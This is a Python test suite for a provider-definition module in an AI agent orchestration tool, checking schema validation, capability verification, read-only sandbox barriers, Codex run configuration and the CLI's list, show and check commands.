#!/usr/bin/env python3
# hermetic: allow-file tmp (the paths and variables of an environment the code is given are text; nothing is made under them)
"""Provider definitions: lib/provider.py (definition, validate2, cap, effective, require_barrier, layout, the verbs) against
lib/providers/schema-2.json. The shipped claude-code, claude-platform and the claude catalog are the real examples; every changed
definition is a copy in a temporary directory, never the user's data.
Run: python3 tests/test_provider.py"""
import hermetic  # noqa: F401  (first: scrubs the caller's environment)
import copy, hashlib, json, os, shutil, stat, subprocess, sys, tempfile, unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.join(HERE, "..")
LIB = os.path.join(ROOT, "lib")
BIN = os.path.join(ROOT, "bin", "qargi")
sys.path.insert(0, LIB)
import provider as P  # noqa: E402


def shipped(rel):
    with open(os.path.join(LIB, "providers", rel)) as f:
        return json.load(f)


CODE = shipped("claude-code.json")                # the local runtime
PLATFORM = shipped("claude-platform.json")        # the cloud runtime
CATALOG = shipped("catalogs/claude.json")         # the models of both


def descriptor():
    """A copy of the shipped claude-code definition, without its contract addenda (the files stay in the shipped directory; a copy in another has none)."""
    d = copy.deepcopy(CODE)
    d["resources"].pop("contract_addenda", None)
    return d


def fails(d, name=None):
    return [m for lvl, m in P.validate2(d, name or d.get("provider") or d.get("family")) if lvl == "fail"]


def warns(d, name=None):
    return [m for lvl, m in P.validate2(d, name or d.get("provider") or d.get("family")) if lvl == "warn"]


def verified(d):
    """The definition d with every capability claim verified."""
    d = copy.deepcopy(d)
    for c in d["capabilities"].values():
        c["verified_on"] = "2026-10-31"
    return d


class Tree(unittest.TestCase):
    """A temporary providers directory beside a copy of provider.py's schema."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="prov.")
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.root = os.path.join(self.tmp, "providers")
        os.makedirs(self.root)
        shutil.copy(os.path.join(LIB, "providers", "schema-2.json"), self.root)

    def put(self, name, d):
        with open(os.path.join(self.root, name + ".json"), "w") as f:
            json.dump(d, f)

    def put_claude(self, adapters=False):
        """The shipped claude-code, claude-platform and the claude catalog (and their adapter directories) in root."""
        self.put("claude-code", CODE)
        self.put("claude-platform", PLATFORM)
        os.makedirs(os.path.join(self.root, "catalogs"), exist_ok=True)
        with open(os.path.join(self.root, "catalogs", "claude.json"), "w") as f:
            json.dump(CATALOG, f)
        for n in ("claude-code", "claude-platform") if adapters else ():
            shutil.copytree(os.path.join(LIB, "providers", n), os.path.join(self.root, n), ignore=shutil.ignore_patterns("__pycache__"))


class Shipped(Tree):
    def test_the_shipped_definitions_and_the_catalog_have_no_failure(self):
        for d, name in ((CODE, "claude-code"), (PLATFORM, "claude-platform"), (CATALOG, "claude")):
            self.assertEqual(fails(d, name), [], name)

    def test_the_shipped_runtimes_warn_for_every_claim_that_is_not_verified(self):
        total = 0
        for d, name in ((CODE, "claude-code"), (PLATFORM, "claude-platform")):
            nulls = ["capabilities.%s.verified_on" % c for c, cl in d["capabilities"].items() if cl["value"] in ("yes", "partial") and cl["verified_on"] is None]
            self.assertEqual(sorted(m.split(":")[0] for m in warns(d, name)), sorted(nulls), name)
            total += len(nulls)
        self.assertGreaterEqual(total, 2)

    def test_a_fully_verified_runtime_is_clean(self):
        self.assertEqual(P.validate2(verified(CODE), "claude-code"), [])
        self.assertEqual(P.validate2(verified(PLATFORM), "claude-platform"), [])

    def test_the_catalog_keeps_the_ids_and_the_aliases_both_runtimes_pass(self):
        self.assertEqual({t: v["model"] for t, v in CATALOG["tiers"].items()},
                         {"fast": "claude-haiku-5-5", "balanced": "claude-sonnet-5-5", "deep": "claude-opus-5-5", "frontier": "claude-fable-5-1"})
        self.assertEqual({t: v["alias"] for t, v in CATALOG["tiers"].items()}, {"fast": "haiku", "balanced": "sonnet", "deep": "opus", "frontier": "fable"})
        self.assertEqual((CODE["family"], CODE["models"]), ("claude", {"catalog": "claude", "use": "alias"}))
        self.assertEqual((PLATFORM["family"], PLATFORM["models"]), ("claude", {"catalog": "claude", "use": "id"}))

    def test_the_openai_catalog_validates_and_every_tier_resolves_to_a_model_of_its_pattern(self):
        cat = shipped("catalogs/openai.json")
        self.assertEqual(fails(cat, "openai"), [])
        self.assertEqual(P.catalog("openai"), cat)
        self.assertEqual((cat["family"], cat["pattern"]), ("openai", "^gpt-[a-z0-9.-]+$"))
        self.assertEqual(set(cat["tiers"]), set(P.TIERS))                       # every tier named, none left to '*'
        self.assertEqual({t: v["model"] for t, v in cat["tiers"].items()},
                         {"fast": "gpt-6-luna", "balanced": "gpt-6.1-terra", "deep": "gpt-6.1-sol", "frontier": "gpt-6-astra"})
        for t, row in cat["tiers"].items():
            with self.subTest(t):
                self.assertRegex(row["model"], cat["pattern"])
                self.assertIsNone(row["alias"])                                 # the runtimes of the family pass the id
                self.assertIsNone(row["verified_on"])                           # not verified until a real run
        self.assertEqual(cat["effort"], {e: e for e in ("low", "medium", "high", "xhigh", "max")})
        broken = copy.deepcopy(cat)
        broken["tiers"]["deep"]["model"] = "o9-deep"
        self.assertTrue(any("does not match pattern" in m for m in fails(broken, "openai")), fails(broken, "openai"))

    def test_the_codex_runtime_is_data_only_held_by_its_sandbox_and_dates_only_what_the_live_checks_showed(self):
        cx = shipped("codex.json")
        self.assertEqual(fails(cx, "codex"), [])
        # the live checks of codex-cli 0.167.1 on 2026-11-11: a write run end to end, the read-only sandbox, the token usage
        live = ("headless_dispatch", "read_only_barrier", "cost_report")
        self.assertEqual({c: cl["verified_on"] for c, cl in cx["capabilities"].items() if cl["verified_on"]}, dict.fromkeys(live, "2026-11-11"))
        for c in live:
            self.assertTrue(cx["capabilities"][c]["source"].startswith("codex-cli 0.167.1, "), c)       # the CLI version the evidence was seen with
            self.assertIn("2026-11-11", cx["capabilities"][c]["source"], c)
        unverified = ("per_dispatch_model_override", "per_dispatch_effort_override", "skills", "mcp")
        self.assertEqual(sorted(m.split(":")[0] for m in warns(cx, "codex")), sorted("capabilities.%s.verified_on" % c for c in unverified))
        for c in ("per_dispatch_model_override", "per_dispatch_effort_override"):                    # accepted in a run, but no event names it
            self.assertIn("not observable", cx["capabilities"][c]["note"], c)
        self.assertIn("not its reads", cx["capabilities"]["read_only_barrier"]["note"])               # the barrier holds shell writes only
        self.assertIn("outside the sandbox", cx["capabilities"]["read_only_barrier"]["note"])
        self.assertEqual({c: cl["value"] for c, cl in cx["capabilities"].items()},
                         {"headless_dispatch": "yes", "per_dispatch_model_override": "yes", "per_dispatch_effort_override": "yes",
                          "read_only_barrier": "partial", "skills": "yes", "resume": "no", "mcp": "yes", "cost_report": "partial"})
        self.assertEqual((cx["family"], cx["surface"], cx["models"], cx["agents"]), ("openai", "local", {"catalog": "openai", "use": "id"}, None))
        self.assertNotIn("adapter", cx)                                                             # data only: no code of its own
        self.assertEqual(cx["resources"]["mcp"], {"file": "config.toml", "format": "toml", "root_pointer": "/mcp_servers", "entry": {"url": "{url}"},   # the tools held per server
                                                  "permission_rule": "mcp__{server}__{tool}", "name_key": "nonword-underscore", "tool_lists": {"allow": "/enabled_tools"}})
        self.assertEqual((cx["session"], cx["renderers"]), ({"render_target": "codex"}, {"packs": {"label": "Codex"}}))   # no launch line: a session is not started on the render
        self.assertEqual(P.cap("codex", "local", "mcp"), "unverified")
        self.assertEqual(cx["barrier"], {"kind": "sandbox-args"})
        self.assertTrue(P.has_class_args(cx["dispatch"]))
        self.assertIsNone(P.barrier_claim_problem(cx))
        self.assertEqual(P.cap("codex", "local", "read_only_barrier"), "partial")                   # partial and dated: a read-only role is held
        self.assertEqual(P.effective("codex", "local", "read_only_barrier"), "partial")
        self.assertEqual((P.cap("codex", "local", "headless_dispatch"), P.cap("codex", "local", "cost_report")), ("yes", "partial"))
        self.assertEqual(P.cap("codex", "local", "per_dispatch_model_override"), "unverified")
        d = cx["dispatch"]
        self.assertEqual((d["mode"], d["prompt"], d["output"]["format"], d["timeout_s"], d["cwd"]), ("command", {"via": "stdin"}, "jsonl", 3600, "{clone}"))
        self.assertEqual(d["output"]["usage"], {"select": {"/type": "turn.completed"}, "tokens": "/usage",                  # tokens only: cost_report partial
                                                "fields": ["input_tokens", "cached_input_tokens", "cache_write_input_tokens", "output_tokens", "reasoning_output_tokens"]})
        self.assertEqual(d["argv"], ["codex", "exec", "--json", "--ephemeral",
                                     "--ignore-rules", "--strict-config",   # no execpolicy rules file of any place; a baseline key this CLI does not know refuses the run
                                     "-C", "{clone}",
                                     {"if": "model", "then": ["-m", "{model}"]}, {"if": "effort", "then": ["-c", "model_reasoning_effort={effort}"]},
                                     "-o", "{final_message}",            # the last message to a private file of the run; qargi publishes it
                                     # a write member commits: its clone's .git is a writable root (the sandbox protects it otherwise); never a read-only one's
                                     {"class": "write", "then": ["--sandbox", "workspace-write", "--add-dir", "{out_dir}", "--add-dir", "{clone}/.git"]},
                                     {"class": "read-only", "then": ["--sandbox", "read-only"]}])
        self.assertNotIn("class_argv", d)
        # the run's CODEX_HOME/config.toml: the user-level configuration of the member's Codex, with a baseline every run gets, MCP or not
        self.assertEqual({k: v for k, v in d["run_config"].items() if k != "baseline"}, {"in": "home", "file": "config.toml"})
        base = d["run_config"]["baseline"]
        self.assertEqual((base["approval_policy"], base["web_search"]), ("never", "disabled"))   # never asks (nobody answers), no hosted search
        self.assertEqual(base["sandbox_workspace_write"], {"network_access": False, "exclude_slash_tmp": True, "exclude_tmpdir_env_var": False})  # TMPDIR only
        self.assertEqual(base["features"], dict.fromkeys(["apps", "plugins", "remote_plugin", "hooks", "computer_use", "browser_use", "in_app_browser",
                                                          "image_generation", "tool_suggest", "skill_mcp_dependency_install"], False))
        self.assertEqual(base["skills"], {"bundled": {"enabled": False}})                    # no bundled skill (an installer, a creator) in a member
        self.assertNotIn("mcp_servers", base)                                                # the servers come from the tool packs alone
        self.assertNotIn("projects", base)                                                   # no trust entry: the clone's .codex/ is not loaded
        self.assertEqual(P.run_config_problems(d, cx["resources"]), [])
        self.assertFalse(any("dangerously" in a or "bypass" in a for a in d["argv"] if isinstance(a, str)))
        # its sandbox mounts a /dev of its own: a run under /dev/shm leaves a read-only member blind, and a write member without its contract
        self.assertEqual({k: v for k, v in d["hidden_paths"].items() if k != "note"}, {"prefixes": ["/dev"], "shown": {"write": ["clone", "out", "tmp"]}})
        self.assertIn("/dev/shm", d["hidden_paths"]["note"])
        self.assertEqual(P.hidden_paths_problems(d), [])
        m = P.models_of("codex", "local")
        self.assertEqual([P.model_for(m, t) for t in P.TIERS], ["gpt-6-luna", "gpt-6.1-terra", "gpt-6.1-sol", "gpt-6-astra"])   # ids: the runtime passes ids
        self.assertEqual(P.contract_addenda("codex", "local")[0].splitlines()[0], "# In a Codex run")
        self.assertEqual(sorted(cx["notes"]), ["commands", "exploration", "identity", "message", "session-model", "skills-dir", "spawn"])

    def test_reserved_names_are_the_agent_types_the_claude_runtime_brings_itself(self):
        self.assertEqual(sorted(CODE["agents"]["reserved_names"]),
                         sorted("general-purpose explore plan statusline-setup claude-code-guide claude output-style-setup".split()))


class Violations(unittest.TestCase):
    def one(self, d, needle, name="claude-code"):
        f = fails(d, name)
        self.assertTrue(any(needle in m for m in f), "%r not in %r" % (needle, f))
        return f

    def test_an_additional_property_deep_inside(self):
        d = descriptor()
        d["capabilities"]["mcp"]["colour"] = "red"
        self.one(d, "capabilities.mcp.colour: additional property is not allowed")

    def test_a_bad_date_in_a_catalog_tier(self):
        c = copy.deepcopy(CATALOG)
        c["tiers"]["fast"]["verified_on"] = "31/10/2026"
        self.one(c, "tiers.fast.verified_on: '31/10/2026' is not a date", "claude")
        c["tiers"]["fast"]["verified_on"] = "2026-02-30"
        self.one(c, "tiers.fast.verified_on: '2026-02-30' is not a date", "claude")

    def test_wrong_type(self):
        d = descriptor()
        d["adapter"] = 3
        self.one(d, "adapter: 3 is not of type string, null")

    def test_a_schema_version_other_than_2(self):
        for version, text in ((3, "schema: 3 is not the supported version 2"), (1, "schema: 1 is not the supported version 2")):
            d = descriptor()
            d["schema"] = version
            self.one(d, text)

    def test_a_document_that_is_not_an_object_is_a_failure_not_a_crash(self):
        self.assertEqual(P.validate2([], "x"), [("fail", "the document is not a JSON object")])
        self.assertEqual(P.validate2(None, "x"), [("fail", "the document is not a JSON object")])


class Cap(Tree):
    def setUp(self):
        super().setUp()
        self.put_claude()

    def test_definition_reads_a_runtime_by_name(self):
        self.assertEqual(P.definition("claude-code", root=self.root)["provider"], "claude-code")
        self.assertEqual(P.definition("claude-platform", root=self.root)["surface"], "cloud")

    def test_definition_of_an_unknown_name_raises(self):
        for n in ("nope", "../claude-code", "schema-2", "adapter-schema", "Claude-Code", "claude", ""):
            with self.assertRaises(P.ProviderError, msg=n):
                P.definition(n, root=self.root)

    def test_definition_of_broken_json_raises(self):
        with open(os.path.join(self.root, "bad.json"), "w") as f:
            f.write("{")
        with self.assertRaises(P.ProviderError):
            P.definition("bad", root=self.root)

    def test_a_definition_that_is_not_schema_2_is_not_read(self):
        self.put("old", dict(CODE, provider="old", schema=1))
        with self.assertRaises(P.ProviderError) as cm:
            P.definition("old", root=self.root)
        self.assertIn("is not a definition of schema 2", str(cm.exception))
        self.assertTrue(any("schema: 1 is not the supported version 2" in m for lvl, m in P.findings_of("old", root=self.root)[2]))

    def test_a_verified_yes_is_yes(self):
        self.assertEqual(P.cap("claude-code", "local", "per_dispatch_model_override", self.root), "yes")
        self.assertEqual(P.effective("claude-code", "local", "per_dispatch_model_override", self.root), "yes")

    def test_a_verified_partial_is_partial(self):
        self.assertEqual(P.cap("claude-code", "local", "read_only_barrier", self.root), "partial")
        self.assertEqual(P.effective("claude-code", "local", "read_only_barrier", self.root), "partial")

    def test_an_unverified_yes_counts_as_no(self):
        self.assertEqual(P.cap("claude-code", "local", "per_dispatch_effort_override", self.root), "unverified")
        self.assertEqual(P.effective("claude-code", "local", "per_dispatch_effort_override", self.root), "no")

    def test_an_unverified_partial_counts_as_no(self):
        d = descriptor()
        d["capabilities"]["read_only_barrier"]["verified_on"] = None
        self.put("claude-code", d)
        self.assertEqual(P.cap("claude-code", "local", "read_only_barrier", self.root), "unverified")
        self.assertEqual(P.effective("claude-code", "local", "read_only_barrier", self.root), "no")

    def test_a_no_is_no_even_without_a_date(self):
        d = copy.deepcopy(PLATFORM)
        d["capabilities"]["read_only_barrier"]["verified_on"] = None
        self.put("claude-platform", d)
        self.assertEqual(P.cap("claude-platform", "cloud", "read_only_barrier", self.root), "no")
        self.assertEqual(P.effective("claude-platform", "cloud", "read_only_barrier", self.root), "no")

    def test_a_surface_the_runtime_does_not_serve_is_no(self):
        self.assertEqual(P.effective("claude-code", "cloud", "skills", self.root), "no")
        self.assertEqual(P.effective("claude-platform", "local", "skills", self.root), "no")

    def test_an_unknown_capability_or_surface_is_an_error(self):
        with self.assertRaises(P.ProviderError):
            P.cap("claude-code", "local", "teleport", self.root)
        with self.assertRaises(P.ProviderError):
            P.cap("claude-code", "moon", "skills", self.root)

    def test_the_default_root_is_beside_provider_py(self):
        self.assertEqual(P.cap("claude-code", "local", "skills"), "yes")


class Barrier(Tree):
    """require_barrier: a read-only role on a surface, from the definition and the project's recorded acceptance."""

    def setUp(self):
        super().setUp()
        self.conf = os.path.join(self.tmp, "conf")
        os.makedirs(os.path.join(self.conf, "projects"))
        self.put_claude()
        for name, base, surface in (("bare-local", CODE, "local"), ("bare-cloud", PLATFORM, "cloud")):
            d = copy.deepcopy(base)
            d.update(provider=name, family=None)
            d["capabilities"]["read_only_barrier"] = {"value": "no", "verified_on": "2026-10-31", "note": "nothing stops a write"}
            self.put(name, d)

    def answers(self, project, models):
        with open(os.path.join(self.conf, "projects", project + ".json"), "w") as f:
            json.dump({"project": project, "models": models}, f)

    def rb(self, provider, surface, project=None):
        return P.require_barrier(provider, surface, project, root=self.root, conf=self.conf)

    ACC = {"by": "me", "at": "2026-10-31T12:00:00Z", "reason": "because I said so"}

    def test_a_partial_barrier_passes_with_its_note(self):
        state, text = self.rb("claude-code", "local")
        self.assertEqual(state, "partial")
        self.assertIn("PreToolUse hook", text)

    def test_no_barrier_is_refused_with_the_command(self):
        state, text = self.rb("claude-platform", "cloud", "alpha")
        self.assertEqual(state, "refused")
        self.assertIn("qargi provider accept claude-platform --surface cloud --no-barrier --project alpha --asked", text)

    def test_the_command_names_a_placeholder_without_a_project(self):
        self.assertIn("--project PROJECT", self.rb("bare-local", "local")[1])

    def test_an_unverified_partial_counts_as_no(self):
        d = descriptor()
        d["provider"] = "unver"
        d["capabilities"]["read_only_barrier"] = {"value": "partial", "verified_on": None, "note": "maybe"}
        self.put("unver", d)
        state, text = self.rb("unver", "local")
        self.assertEqual(state, "refused")
        self.assertIn("not verified", text)

    def test_the_shipped_codex_barrier_holds_by_its_date_and_an_undated_copy_is_refused(self):
        os.makedirs(os.path.join(self.root, "catalogs"), exist_ok=True)
        with open(os.path.join(self.root, "catalogs", "openai.json"), "w") as f:
            json.dump(shipped("catalogs/openai.json"), f)
        cx = shipped("codex.json")
        cx["resources"].pop("contract_addenda", None)                                       # the files stay in the shipped directory
        self.put("codex", cx)
        state, text = self.rb("codex", "local", "alpha")
        self.assertEqual(state, "partial")                                                  # dated: a read-only role is held, with the note
        self.assertIn("not its reads", text)
        cx["capabilities"]["read_only_barrier"]["verified_on"] = None                       # the same claim with the date removed
        self.put("codex", cx)
        state, text = self.rb("codex", "local", "alpha")
        self.assertEqual(state, "refused")
        self.assertIn("not verified", text)
        self.assertIn("qargi provider accept codex --surface local --no-barrier --project alpha", text)

    def test_a_recorded_acceptance_allows_it_for_that_surface_only(self):
        self.answers("alpha", {"accept_no_barrier": {"cloud": self.ACC}})
        self.assertEqual(self.rb("claude-platform", "cloud", "alpha")[0], "accepted")
        self.assertEqual(self.rb("bare-cloud", "cloud", "alpha")[0], "accepted")
        self.assertEqual(self.rb("bare-local", "local", "alpha")[0], "refused")
        self.assertEqual(self.rb("claude-platform", "cloud", "beta")[0], "refused")

    def test_a_malformed_acceptance_is_none(self):
        for rec in ({"by": "me"}, "yes", {**self.ACC, "extra": 1}, {**self.ACC, "reason": ""}):
            self.answers("alpha", {"accept_no_barrier": {"cloud": rec}})
            self.assertIsNone(P.accepted("alpha", "cloud", self.conf), rec)
        self.answers("alpha", {"accept_no_barrier": "all"})
        self.assertIsNone(P.accepted("alpha", "cloud", self.conf))

    def test_a_verified_yes_passes_silently(self):
        d = descriptor()
        d["provider"] = "solid"
        d["capabilities"]["read_only_barrier"] = {"value": "yes", "verified_on": "2026-10-31", "note": "enforced"}
        self.put("solid", d)
        self.assertEqual(self.rb("solid", "local"), ("yes", ""))

    def test_an_unknown_provider_raises(self):
        with self.assertRaises(P.ProviderError):
            self.rb("nope", "cloud")

    def test_the_cli_exits_2_when_refused_and_0_when_accepted_or_partial(self):
        env = dict(os.environ, QARGI_CONF=self.conf, QARGI_STATE=os.path.join(self.tmp, "state"), HOME=os.path.join(self.tmp, "home"))
        os.makedirs(env["HOME"])

        def rb(*a):
            r = subprocess.run([sys.executable, "-I", os.path.join(LIB, "provider.py"), "require-barrier"] + list(a), capture_output=True, text=True, env=env)
            return r.returncode, r.stderr
        rc, err = rb("claude-platform", "cloud", "--project", "alpha")
        self.assertEqual(rc, 2)
        self.assertIn("qargi provider accept claude-platform --surface cloud --no-barrier --project alpha", err)
        rc, err = rb("claude-code", "local")
        self.assertEqual((rc, "partial read-only barrier" in err), (0, True))
        self.answers("alpha", {"accept_no_barrier": {"cloud": self.ACC}})
        self.assertEqual(rb("claude-platform", "cloud", "--project", "alpha"), (0, ""))
        self.assertEqual(rb("nope", "cloud")[0], 1)
        self.assertEqual(rb("claude-code", "moon")[0], 1)


class CliBase(Tree):
    """The verbs, run from a copy of provider.py with its own providers/ (so a changed definition never touches lib/)."""

    def setUp(self):
        super().setUp()
        self.copy = os.path.join(self.tmp, "lib")
        os.makedirs(self.copy)
        shutil.copy(os.path.join(LIB, "provider.py"), self.copy)
        os.rename(self.root, os.path.join(self.copy, "providers"))
        self.root = os.path.join(self.copy, "providers")
        self.put_claude(adapters=True)

    def run_cli(self, *args):
        r = subprocess.run([sys.executable, "-I", os.path.join(self.copy, "provider.py")] + list(args), capture_output=True, text=True)
        return r.returncode, r.stdout, r.stderr

    def other(self, mutate, name="other", base=CODE):
        """A copy of a shipped definition under another name, in no family and with no adapter (its directory is not copied)."""
        d = copy.deepcopy(base)
        d.update(provider=name, family=None, adapter=None)
        del d["adapter_verbs"]
        d.get("resources", {}).pop("contract_addenda", None)               # its directory is not copied, so neither are the files it names
        mutate(d)
        self.put(name, d)


class Cli(CliBase):

    def test_list_has_one_line_per_provider_with_surfaces_and_state(self):
        rc, out, _ = self.run_cli("list")
        self.assertEqual(rc, 0)
        lines = out.strip().splitlines()
        self.assertEqual(len(lines), 2)
        self.assertEqual(lines[0].split(), ["claude-code", "local", "%d" % len(warns(CODE, "claude-code")), "warnings"])
        self.assertEqual(lines[1].split(), ["claude-platform", "cloud", "clean"])

    def test_list_says_clean_for_a_clean_definition_and_counts_failures(self):
        self.other(lambda d: d.update(verified(d)), "tidy")
        self.other(lambda d: d.update(extra=1), "broken")
        rc, out, _ = self.run_cli("list")
        rows = {ln.split()[0]: ln.split()[1:] for ln in out.strip().splitlines()}
        self.assertEqual(rc, 0)
        self.assertEqual(list(rows), ["broken", "claude-code", "claude-platform", "tidy"])
        self.assertEqual(rows["tidy"], ["local", "clean"])
        self.assertEqual(rows["broken"][0], "local")
        self.assertEqual(rows["broken"][-1], "failure")

    def test_list_does_not_show_the_schema_files(self):
        self.assertNotIn("schema", self.run_cli("list")[1])

    def test_list_with_an_argument_is_a_usage_error(self):
        self.assertEqual(self.run_cli("list", "x")[0], 2)

    def test_show_prints_tiers_effort_and_the_capabilities(self):
        rc, out, _ = self.run_cli("show", "claude-code")
        self.assertEqual(rc, 0)
        self.assertRegex(out, r"fast\s+claude-haiku-5-5\s+alias haiku\s+verified: no")
        self.assertRegex(out, r"frontier\s+claude-fable-5-1\s+alias fable")
        self.assertRegex(out, r"xhigh\s+xhigh")
        self.assertRegex(out, r"per_dispatch_model_override\s+yes\s+verified 2026-10-31\s+Agent tool model parameter overrides the definition")
        self.assertRegex(out, r"read_only_barrier\s+partial\s+verified 2026-10-31")
        rc, out, _ = self.run_cli("show", "claude-platform")
        self.assertEqual(rc, 0)
        self.assertRegex(out, r"per_dispatch_model_override\s+yes\s+verified 2026-11-01\s+a session created with a model override")
        self.assertRegex(out, r"read_only_barrier\s+no\s+-\s+cloud review agents")

    def test_show_json_is_the_definition(self):
        for name, d in (("claude-code", CODE), ("claude-platform", PLATFORM)):
            rc, out, _ = self.run_cli("show", name, "--json")
            self.assertEqual(rc, 0)
            self.assertEqual(json.loads(out), d)

    def test_show_an_unknown_name_exits_1(self):
        for a in (["show", "nope"], ["check", "nope"], ["show", "../claude-code"], ["check", "schema-2"], ["show", "claude"]):
            rc, out, err = self.run_cli(*a)
            self.assertEqual(rc, 1, a)
            self.assertIn("unknown provider", err)
            self.assertEqual(out, "")

    def test_show_and_check_without_a_name_is_a_usage_error(self):
        self.assertEqual(self.run_cli("show")[0], 2)
        self.assertEqual(self.run_cli("check")[0], 2)
        self.assertEqual(self.run_cli()[0], 2)
        self.assertEqual(self.run_cli("nonsense")[0], 2)

    def test_check_of_a_valid_definition_exits_0_and_warns(self):
        rc, out, _ = self.run_cli("check", "claude-code")
        self.assertEqual(rc, 0)
        self.assertEqual(out.count("warn: "), len(warns(CODE, "claude-code")))
        self.assertIn("0 failures", out)
        self.assertIn("warn: capabilities.mcp.verified_on: not verified", out)

    def test_check_says_what_degrades_on_the_surface(self):
        out = self.run_cli("check", "claude-code")[1]
        self.assertRegex(out, r"local: per_dispatch_effort_override\s+unverified \(counts as no\)")
        self.assertRegex(out, r"local: session_budget_ceiling\s+no")
        self.assertNotRegex(out, r"local: per_dispatch_model_override")
        self.assertNotRegex(out, r"local: read_only_barrier")
        self.assertNotIn("cloud", out)

    def test_a_cloud_read_only_barrier_of_no_means_review_cannot_be_served_there(self):
        out = self.run_cli("check", "claude-platform")[1]
        self.assertRegex(out, r"cloud: read_only_barrier\s+no")
        self.assertNotRegex(out, r"cloud: per_dispatch_model_override")
        self.assertIn("the review role cannot be served on cloud", out)
        self.assertNotIn("cannot be served on local", self.run_cli("check", "claude-code")[1])

    def test_an_unverified_read_only_barrier_cannot_serve_review_either(self):
        self.other(lambda d: d["capabilities"]["read_only_barrier"].update(value="yes", verified_on=None))
        out = self.run_cli("check", "other")[1]
        self.assertRegex(out, r"local: read_only_barrier\s+unverified \(counts as no\)")
        self.assertIn("the review role cannot be served on local", out)

    def test_a_verified_read_only_barrier_serves_review(self):
        self.other(lambda d: d["capabilities"]["read_only_barrier"].update(value="yes"))
        self.assertNotIn("cannot be served", self.run_cli("check", "other")[1])

    def test_a_barrier_of_no_on_local_prints_the_line(self):
        self.other(lambda d: d["capabilities"]["read_only_barrier"].update(value="no"))
        self.assertIn("the review role cannot be served on local", self.run_cli("check", "other")[1])

    def test_check_reports_that_the_adapter_exists_and_is_executable(self):
        rc, out, _ = self.run_cli("check", "claude-code")
        self.assertEqual(rc, 0)
        self.assertIn("adapter: adapter (exists, executable)", out)

    def test_check_fails_for_an_adapter_that_is_missing_or_not_executable(self):
        adapter = os.path.join(self.root, "claude-code", "adapter")
        os.chmod(adapter, 0o644)
        rc, out, _ = self.run_cli("check", "claude-code")
        self.assertEqual(rc, 1)
        self.assertIn("fail: adapter: adapter is not executable", out)
        os.remove(adapter)
        rc, out, _ = self.run_cli("check", "claude-code")
        self.assertEqual(rc, 1)
        self.assertIn("fail: adapter: adapter does not exist", out)

    def test_check_says_so_for_a_provider_with_no_adapter(self):
        self.other(lambda d: None)
        rc, out, _ = self.run_cli("check", "other")
        self.assertEqual(rc, 0)
        self.assertIn("adapter: none", out)

    def test_check_fails_with_exit_1_on_each_kind_of_violation(self):
        cases = {
            "additional": lambda d: d.update(extra=1),
            "name": lambda d: d.update(provider="elsewhere"),
            "capability": lambda d: d["capabilities"].update(teleport=d["capabilities"]["mcp"]),
            "catalog": lambda d: d["models"].update(catalog="gone"),
            "schema": lambda d: d.update(schema=1),
        }
        for label, mutate in cases.items():
            with self.subTest(label):
                self.other(mutate)
                rc, out, _ = self.run_cli("check", "other")
                self.assertEqual(rc, 1)
                self.assertRegex(out, r"fail: ")
                self.assertNotRegex(out, r"\b0 failures")

    def test_check_of_broken_json_exits_1(self):
        with open(os.path.join(self.root, "bad.json"), "w") as f:
            f.write("{")
        rc, _, err = self.run_cli("check", "bad")
        self.assertEqual(rc, 1)
        self.assertIn("not readable JSON", err)

    def test_through_qargi_itself(self):
        env = dict(os.environ, QARGI_CONF=os.path.join(self.tmp, "conf"), QARGI_STATE=os.path.join(self.tmp, "state"), HOME=os.path.join(self.tmp, "home"))
        os.makedirs(env["HOME"])

        def q(*a):
            r = subprocess.run([BIN, "provider"] + list(a), capture_output=True, text=True, env=env)
            return r.returncode, r.stdout, r.stderr
        rc, out, _ = q("list")
        self.assertEqual(rc, 0)
        self.assertRegex(out, r"^claude-code\s+local\s+\d+ warnings")
        self.assertRegex(out, r"claude-platform\s+cloud\s+clean")
        rc, out, _ = q("show", "claude-code")
        self.assertEqual(rc, 0)
        self.assertIn("claude-haiku-5-5", out)
        rc, out, _ = q("check", "claude-platform")
        self.assertEqual(rc, 0)
        self.assertIn("the review role cannot be served on cloud", out)
        self.assertEqual(q("check", "nope")[0], 1)
        self.assertEqual(json.loads(q("show", "claude-code", "--json")[1]), CODE)
        rc, out, _ = q("list")
        self.assertRegex(out, r"(?m)^codex\s+local\s+4 warnings$")                     # the four unverified claims, no failure
        rc, out, _ = q("check", "codex")
        self.assertEqual(rc, 0, out)
        self.assertNotIn("the review role cannot be served", out)                       # the sandbox barrier is dated: partial, a review role is held
        self.assertRegex(out, r"(?m)^  local: per_dispatch_model_override\s+unverified \(counts as no\)$")
        self.assertNotRegex(out, r"(?m)^  local: (read_only_barrier|headless_dispatch|cost_report)\s")
        for t, m in (("fast", "gpt-6-luna"), ("balanced", "gpt-6.1-terra"), ("deep", "gpt-6.1-sol"), ("frontier", "gpt-6-astra")):
            self.assertEqual(q("model", "codex", "local", t)[:2], (0, m + "\n"), t)


class Layout(Tree):
    """Where a runtime keeps skills, agents, settings and memory, and how a session is launched: read from its resources and session."""

    def setUp(self):
        super().setUp()
        self.put_claude()

    def without(self, *path):
        """The claude-code definition with the key at path removed."""
        d = descriptor()
        node = d
        for k in path[:-1]:
            node = node[k]
        del node[path[-1]]
        return d

    def test_the_shipped_claude_code_layout_is_complete(self):
        lay = P.layout("claude-code", root=self.root, home="/h")
        self.assertEqual(lay["project_skills_dir"], ".claude/skills")
        self.assertEqual(lay["user_skills_dir"], "/h/.claude/skills")
        self.assertEqual([s["scope"] for s in lay["settings_files"]], ["user", "project", "project-local"])
        self.assertEqual(lay["exclusion"], {"file_key": "skillOverrides", "off_value": "off"})
        self.assertEqual(lay["checkout_key"], "nonalnum-dash")
        self.assertEqual(lay["render_target"], "claude-code")
        self.assertIn("{render}", lay["session_launch"])

    def test_a_runtime_without_resources_or_session_has_every_field_null(self):
        d = descriptor()
        d.update(provider="bare", resources={})
        del d["session"]
        self.put("bare", d)
        lay = P.layout("bare", root=self.root)
        self.assertEqual(set(lay), set(P.LAYOUT_FIELDS))
        self.assertTrue(all(v is None for v in lay.values()))

    def test_the_accessor_expands_the_home_and_leaves_project_paths_relative(self):
        lay = P.layout("claude-code", root=self.root, home="/h/me")
        self.assertEqual(lay["user_skills_dir"], "/h/me/.claude/skills")
        self.assertEqual(lay["user_agents_dir"], "/h/me/.claude/agents")
        self.assertEqual(lay["project_skills_dir"], ".claude/skills")
